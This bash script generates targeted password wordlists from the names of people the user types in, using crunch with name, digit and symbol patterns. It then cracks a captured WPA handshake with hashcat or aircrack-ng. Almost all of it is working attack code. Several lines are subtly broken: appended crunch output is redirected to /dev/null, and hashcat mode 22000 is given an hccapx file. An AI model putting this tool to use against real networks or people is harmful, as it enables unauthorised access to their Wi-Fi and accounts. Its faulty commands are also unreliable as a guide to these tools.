#!/bin/bash

# Check if cap2hccapx is installed
if ! command -v /usr/lib/hashcat-utils/cap2hccapx.bin &> /dev/null
then
    echo "[!] cap2hccapx is not installed. Installing hashcat-utils package..."
    if [ "$(id -u)" != "0" ]; then
        sudo apt-get update
        sudo apt-get install hashcat-utils
    else
        apt-get update
        apt-get install hashcat-utils
    fi
else
    echo "[+] cap2hccapx is already installed."
fi

# Ask for number of people
read -p "[?] How many people do you want to generate passwords for? " NUM_PEOPLE

# Validate input
if ! [[ "$NUM_PEOPLE" =~ ^[0-9]+$ ]] || [ "$NUM_PEOPLE" -lt 1 ]; then
    echo "[!] Invalid number. Using 1 as default."
    NUM_PEOPLE=1
fi

# Arrays to store names
declare -a FIRST_NAMES
declare -a LAST_NAMES

# Collect all names
for ((i=1; i<=NUM_PEOPLE; i++)); do
    echo ""
    echo "[*] Person #$i:"
    read -p "    Enter First Name: " FIRST_NAME
    read -p "    Enter Last Name (leave blank if none): " LAST_NAME

    FIRST_NAMES+=("$FIRST_NAME")
    LAST_NAMES+=("$LAST_NAME")
done

echo ""
read -p "[?] Enter Cap File Path (leave blank if only want to generate wordlist): " CAP_PATH

if [ "$CAP_PATH" ]; then
  read -p "[?] Want to use (H)ashcat or (A)ircrack ? (h or a): " ATTACK_TOOL
  ATTACK_TOOL=$(echo "$ATTACK_TOOL" | tr '[:upper:]' '[:lower:]')
fi

echo ""
echo "[*] Starting password generation for $NUM_PEOPLE person(s)..."
echo ""

# Function to generate patterns for a single person
generate_patterns() {
    local FIRST_NAME="$1"
    local LAST_NAME="$2"
    local PID="$3"

    local firstname=$(echo "$FIRST_NAME" | tr '[:upper:]' '[:lower:]')
    local lastname=$(echo "$LAST_NAME" | tr '[:upper:]' '[:lower:]')
    # Capitalize first letter - compatible with all bash/OS versions
    local Firstname=$(echo "$firstname" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}')
    local Lastname=$(echo "$lastname" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}')
    local FN_LENGTH=${#FIRST_NAME}
    local LN_LENGTH=${#LAST_NAME}

    echo "[>>] Generating patterns for: $FIRST_NAME $LAST_NAME"

    # Generate passwords without last name
    echo "[*] Generating $firstname patterns..."
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t $firstname%%% -o w1_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t $Firstname%%% -o w2_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname%%%% -o w3_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname%%%% -o w4_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname@%%% -l $escape -o w5_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname@%%% -l $escape -o w6_p${PID}.txt &> /dev/null

    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t %%%$firstname -o w7_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t %%%$Firstname -o w8_p${PID}.txt &> /dev/null

    escape="aaa@$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t %%%@$Firstname -l $escape -o w9_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t %%%@$firstname -l $escape -o w10_p${PID}.txt &> /dev/null

    # Advanced patterns with @ symbol (1-4 digits)
    echo "[*] Generating $Firstname@1 to $Firstname@9999..."
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@a"
    crunch $((FN_LENGTH+2)) $((FN_LENGTH+2)) -t $Firstname@% -l $escape -o w15_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aa"
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t $Firstname@%% -l $escape >> w15_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname@%%% -l $escape >> w15_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aaaa"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t $Firstname@%%%% -l $escape >> w15_p${PID}.txt &> /dev/null

    echo "[*] Generating $firstname@1 to $firstname@9999..."
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@a"
    crunch $((FN_LENGTH+2)) $((FN_LENGTH+2)) -t $firstname@% -l $escape -o w16_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aa"
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t $firstname@%% -l $escape >> w16_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aaaa"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t $firstname@%%%% -l $escape >> w16_p${PID}.txt &> /dev/null

    # Advanced patterns with # symbol (1-4 digits)
    echo "[*] Generating # symbol patterns..."
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#a"
    crunch $((FN_LENGTH+2)) $((FN_LENGTH+2)) -t $Firstname#% -l $escape -o w17_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#aa"
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t $Firstname#%% -l $escape >> w17_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname#%%% -l $escape >> w17_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#aaaa"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t $Firstname#%%%% -l $escape >> w17_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#a"
    crunch $((FN_LENGTH+2)) $((FN_LENGTH+2)) -t $firstname#% -l $escape -o w18_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#aa"
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t $firstname#%% -l $escape >> w18_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname#%%% -l $escape >> w18_p${PID}.txt &> /dev/null
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#aaaa"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t $firstname#%%%% -l $escape >> w18_p${PID}.txt &> /dev/null

    # Patterns with ! _ $ . * symbols
    echo "[*] Generating special symbol patterns..."
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))!aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname!%%% -l $escape -o w19_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname!%%% -l $escape -o w20_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))_aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname"_"%%% -l $escape -o w21_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname"_"%%% -l $escape -o w22_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))\$aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname\$%%% -l $escape -o w23_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname\$%%% -l $escape -o w24_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH)).aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname.%%% -l $escape -o w25_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname.%%% -l $escape -o w26_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))*aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname"*"%%% -l $escape -o w27_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname"*"%%% -l $escape -o w28_p${PID}.txt &> /dev/null

    # Numbers at start with symbols
    echo "[*] Generating number-first patterns..."
    escape="a@$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
    crunch $((FN_LENGTH+2)) $((FN_LENGTH+2)) -t %@$Firstname -l $escape -o w29_p${PID}.txt &> /dev/null
    escape="aa@$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t %%@$Firstname -l $escape >> w29_p${PID}.txt &> /dev/null
    escape="aaaa@$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t %%%%@$Firstname -l $escape >> w29_p${PID}.txt &> /dev/null

    escape="a#$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
    crunch $((FN_LENGTH+2)) $((FN_LENGTH+2)) -t %#$Firstname -l $escape -o w30_p${PID}.txt &> /dev/null
    escape="aa#$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
    crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t %%#$Firstname -l $escape >> w30_p${PID}.txt &> /dev/null
    escape="aaa#$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t %%%#$Firstname -l $escape >> w30_p${PID}.txt &> /dev/null
    escape="aaaa#$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t %%%%#$Firstname -l $escape >> w30_p${PID}.txt &> /dev/null

    # Double and triple symbol patterns
    echo "[*] Generating multi-symbol patterns..."
    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@#aaa"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t $Firstname@#%%% -l $escape -o w31_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t $firstname@#%%% -l $escape -o w32_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))#@aaa"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t $Firstname#@%%% -l $escape -o w33_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@!aaa"
    crunch $((FN_LENGTH+5)) $((FN_LENGTH+5)) -t $Firstname@!%%% -l $escape -o w34_p${PID}.txt &> /dev/null

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@#!aaa"
    crunch $((FN_LENGTH+6)) $((FN_LENGTH+6)) -t $Firstname@#!%%% -l $escape -o w35_p${PID}.txt &> /dev/null

    # Name slicing patterns
    if [ $FN_LENGTH -ge 3 ]; then
        echo "[*] Generating name slicing patterns..."
        local firstname_slice3="${firstname:0:3}"
        local Firstname_slice3="${Firstname:0:3}"

        escape="aaa@aaa"
        crunch 7 7 -t ${Firstname_slice3}@%%% -l $escape -o w36_p${PID}.txt &> /dev/null
        crunch 7 7 -t ${firstname_slice3}@%%% -l $escape -o w37_p${PID}.txt &> /dev/null

        escape="aaa#aaa"
        crunch 7 7 -t ${Firstname_slice3}#%%% -l $escape -o w38_p${PID}.txt &> /dev/null

        escape="aaa@a"
        crunch 5 5 -t ${Firstname_slice3}@% -l $escape -o w39_p${PID}.txt &> /dev/null
        escape="aaa@aa"
        crunch 6 6 -t ${Firstname_slice3}@%% -l $escape >> w39_p${PID}.txt &> /dev/null
        escape="aaa@aaaa"
        crunch 8 8 -t ${Firstname_slice3}@%%%% -l $escape >> w39_p${PID}.txt &> /dev/null
    fi

    if [ $FN_LENGTH -ge 4 ]; then
        local firstname_slice4="${firstname:0:4}"
        local Firstname_slice4="${Firstname:0:4}"

        escape="aaaa@aaa"
        crunch 8 8 -t ${Firstname_slice4}@%%% -l $escape -o w40_p${PID}.txt &> /dev/null

        escape="aaaa#aaa"
        crunch 8 8 -t ${Firstname_slice4}#%%% -l $escape -o w41_p${PID}.txt &> /dev/null
    fi

    # Reverse name patterns
    echo "[*] Generating reverse name patterns..."
    local firstname_rev=$(echo "$firstname" | rev)
    local Firstname_rev=$(echo "$firstname_rev" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}')

    escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aaa"
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t ${Firstname_rev}@%%% -l $escape -o w42_p${PID}.txt &> /dev/null
    crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t ${firstname_rev}@%%% -l $escape -o w43_p${PID}.txt &> /dev/null

    # Lastname patterns
    if [ $LN_LENGTH -ne 0 ]; then
        echo "[*] Generating lastname combination patterns..."
        crunch $((FN_LENGTH+LN_LENGTH+3)) $((FN_LENGTH+LN_LENGTH+3)) -t $firstname$lastname%%% -o w11_p${PID}.txt &> /dev/null
        crunch $((FN_LENGTH+LN_LENGTH+3)) $((FN_LENGTH+LN_LENGTH+3)) -t $Firstname$Lastname%%% -o w12_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@a"
        crunch $((FN_LENGTH+LN_LENGTH+2)) $((FN_LENGTH+LN_LENGTH+2)) -t $firstname$lastname@% -l $escape -o w13_p${PID}.txt &> /dev/null
        crunch $((FN_LENGTH+LN_LENGTH+2)) $((FN_LENGTH+LN_LENGTH+2)) -t $Firstname$Lastname@% -l $escape -o w14_p${PID}.txt &> /dev/null

        # Extended lastname patterns
        echo "[*] Generating extended lastname patterns..."
        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@aa"
        crunch $((FN_LENGTH+LN_LENGTH+3)) $((FN_LENGTH+LN_LENGTH+3)) -t $Firstname$Lastname@%% -l $escape -o w44_p${PID}.txt &> /dev/null
        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@aaa"
        crunch $((FN_LENGTH+LN_LENGTH+4)) $((FN_LENGTH+LN_LENGTH+4)) -t $Firstname$Lastname@%%% -l $escape >> w44_p${PID}.txt &> /dev/null
        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@aaaa"
        crunch $((FN_LENGTH+LN_LENGTH+5)) $((FN_LENGTH+LN_LENGTH+5)) -t $Firstname$Lastname@%%%% -l $escape >> w44_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@aa"
        crunch $((FN_LENGTH+LN_LENGTH+3)) $((FN_LENGTH+LN_LENGTH+3)) -t $firstname$lastname@%% -l $escape -o w45_p${PID}.txt &> /dev/null
        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@aaa"
        crunch $((FN_LENGTH+LN_LENGTH+4)) $((FN_LENGTH+LN_LENGTH+4)) -t $firstname$lastname@%%% -l $escape >> w45_p${PID}.txt &> /dev/null
        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@aaaa"
        crunch $((FN_LENGTH+LN_LENGTH+5)) $((FN_LENGTH+LN_LENGTH+5)) -t $firstname$lastname@%%%% -l $escape >> w45_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))#aaa"
        crunch $((FN_LENGTH+LN_LENGTH+4)) $((FN_LENGTH+LN_LENGTH+4)) -t $Firstname$Lastname#%%% -l $escape -o w46_p${PID}.txt &> /dev/null
        crunch $((FN_LENGTH+LN_LENGTH+4)) $((FN_LENGTH+LN_LENGTH+4)) -t $firstname$lastname#%%% -l $escape -o w47_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))!aaa"
        crunch $((FN_LENGTH+LN_LENGTH+4)) $((FN_LENGTH+LN_LENGTH+4)) -t $Firstname$Lastname!%%% -l $escape -o w48_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))_aaa"
        crunch $((FN_LENGTH+LN_LENGTH+4)) $((FN_LENGTH+LN_LENGTH+4)) -t $Firstname$Lastname"_"%%% -l $escape -o w49_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))\$aaa"
        crunch $((FN_LENGTH+LN_LENGTH+4)) $((FN_LENGTH+LN_LENGTH+4)) -t $Firstname$Lastname\$%%% -l $escape -o w50_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH)).$(printf 'a%.0s' $(seq 1 $LN_LENGTH))@aaa"
        crunch $((FN_LENGTH+LN_LENGTH+5)) $((FN_LENGTH+LN_LENGTH+5)) -t $Firstname.$Lastname@%%% -l $escape -o w51_p${PID}.txt &> /dev/null
        crunch $((FN_LENGTH+LN_LENGTH+5)) $((FN_LENGTH+LN_LENGTH+5)) -t $firstname.$lastname@%%% -l $escape -o w52_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@#aaa"
        crunch $((FN_LENGTH+LN_LENGTH+5)) $((FN_LENGTH+LN_LENGTH+5)) -t $Firstname$Lastname@#%%% -l $escape -o w53_p${PID}.txt &> /dev/null

        escape="aaa@$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))"
        crunch $((FN_LENGTH+LN_LENGTH+4)) $((FN_LENGTH+LN_LENGTH+4)) -t %%%@$Firstname$Lastname -l $escape -o w54_p${PID}.txt &> /dev/null

        # Lastname only patterns
        echo "[*] Generating lastname-only patterns..."
        escape="$(printf 'a%.0s' $(seq 1 $LN_LENGTH))@aaa"
        crunch $((LN_LENGTH+4)) $((LN_LENGTH+4)) -t $Lastname@%%% -l $escape -o w55_p${PID}.txt &> /dev/null
        crunch $((LN_LENGTH+4)) $((LN_LENGTH+4)) -t $lastname@%%% -l $escape -o w56_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $LN_LENGTH))#aaa"
        crunch $((LN_LENGTH+4)) $((LN_LENGTH+4)) -t $Lastname#%%% -l $escape -o w57_p${PID}.txt &> /dev/null

        escape="$(printf 'a%.0s' $(seq 1 $LN_LENGTH))@a"
        crunch $((LN_LENGTH+2)) $((LN_LENGTH+2)) -t $Lastname@% -l $escape -o w58_p${PID}.txt &> /dev/null
        escape="$(printf 'a%.0s' $(seq 1 $LN_LENGTH))@aa"
        crunch $((LN_LENGTH+3)) $((LN_LENGTH+3)) -t $Lastname@%% -l $escape >> w58_p${PID}.txt &> /dev/null
        escape="$(printf 'a%.0s' $(seq 1 $LN_LENGTH))@aaaa"
        crunch $((LN_LENGTH+5)) $((LN_LENGTH+5)) -t $Lastname@%%%% -l $escape >> w58_p${PID}.txt &> /dev/null
    fi

    echo "[+] Completed patterns for $FIRST_NAME $LAST_NAME"
    echo ""
}

# Generate patterns for all people
for ((idx=0; idx<NUM_PEOPLE; idx++)); do
    FIRST_NAME="${FIRST_NAMES[$idx]}"
    LAST_NAME="${LAST_NAMES[$idx]}"
    PERSON_ID=$((idx+1))

    generate_patterns "$FIRST_NAME" "$LAST_NAME" "$PERSON_ID"
done

# Generate numerical patterns (1-9999, shared for all)
echo "[*] Generating numerical patterns (1-9999)..."
crunch 1 1 -t % -o numbers.txt &> /dev/null
crunch 2 2 -t %% >> numbers.txt &> /dev/null
crunch 3 3 -t %%% >> numbers.txt &> /dev/null
crunch 4 4 -t %%%% >> numbers.txt &> /dev/null

# Merge all password lists
echo ""
echo "[*] Merging all wordlists into mega_wordlist.txt..."

# Merge all w*_p*.txt files
cat w*_p*.txt numbers.txt 2>/dev/null > mega_wordlist.txt

# Clean up temporary files
rm w*_p*.txt numbers.txt 2>/dev/null

echo ""
echo "[>>] Total Passwords Generated: $(wc -l < mega_wordlist.txt) [mega_wordlist.txt]"
echo ""

# Attack if CAP file provided
if [ "$CAP_PATH" ]; then
  if [ "$ATTACK_TOOL" == "h" ]; then
    echo "[*] Cracking handshake using hashcat..."
    echo "[*] Converting cap to hccapx file format ..."
    /usr/lib/hashcat-utils/cap2hccapx.bin "$CAP_PATH" handshake.hccapx &> /dev/null && echo "[+] Done!"
    echo "[*] Cracking Hash using Hashcat ..."
    hashcat -m 22000 handshake.hccapx mega_wordlist.txt
  else
    echo "[*] Cracking handshake using aircrack-ng..."
    aircrack-ng -w mega_wordlist.txt "$CAP_PATH"
  fi
fi
